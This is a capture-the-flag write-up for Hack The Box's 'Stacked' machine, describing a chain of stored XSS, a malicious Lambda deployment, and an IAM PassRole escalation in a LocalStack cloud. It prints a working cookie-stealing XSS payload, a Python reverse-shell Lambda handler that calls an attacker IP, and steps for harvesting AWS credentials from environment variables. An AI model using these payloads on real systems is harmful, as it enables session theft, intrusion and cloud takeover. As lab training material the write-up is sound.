---
title: "HTB: Stacked"
tags: [htb, cloud, serverless, lambda, aws, localstack, xss]

description: "Breaking out of a Serverless Lambda function. Chaining XSS to Lambda deployment, then pivoting to the Cloud Controller."
---

# Hack The Box: Stacked

**Machine IP**: `10.10.11.x`
**OS**: Cloud
**Difficulty**: Insane

Stacked targets the "Serverless" myth. It demonstrates that Lambda functions are just containers, and if they are over-privileged, they can compromise the entire infrastructure.

## 1. Reconnaissance (XSS to Access)

The application behaves like a serverless management console.
We identify a **Stored XSS** vulnerability in the "Contact Us" form.
We inject a payload that steals the cookies of the admin when they view the message.
```javascript
<script>fetch('http://10.10.14.14/?c='+document.cookie)</script>
```
We obtain the session cookie and log in.

## 2. Exploitation (Lambda Deployment)

The Admin panel interacts with **LocalStack** (simulating AWS). It allows us to deploy new Lambda functions.
We write a python Lambda function to get a shell.

**lambda_function.py**:
```python
import socket, subprocess, os

def lambda_handler(event, context):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.14",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    return "Shell spawned"
```

We zip it and deploy via the web UI.
We trigger the function using the API Gateway URL provided by the dashboard.

## 3. Container Breakout

We catch the shell.
`uid=1000(sbx_user1051) gid=495 group=495`
We are inside a Docker container (the Lambda runtime). It is ephemeral.
However, Lambda functions have Environment Variables injected by the runtime.

```bash
env
```
Key Variables:
*   `AWS_ACCESS_KEY_ID`
*   `AWS_SECRET_ACCESS_KEY`
*   `AWS_SESSION_TOKEN`

These are the credentials for the **Execution Role** of the Lambda.

## 4. Privilege Escalation (IAM:PassRole)

We configure `aws cli` with these keys.
We check permissions. The role has `IAM:PassRole` and `CloudFormation:CreateStack`.
This allows us to create *new* infrastructure with potentially higher privileges than we currently have.

We define a CloudFormation template that spins up a new EC2 instance and grants it `AdministratorAccess`.
Because we have `PassRole`, we can assign the Admin role to the new instance, even though *we* are not Admins.

We SSH into the new instance. We are root on the "host" managing the local stack.

## Conclusion
"Serverless" is a misnomer. It's just "Someone Else's Server." If you grant your Lambda function `AdministratorAccess` "just to make it work," you have given anyone who can modify that code full control of your cloud.
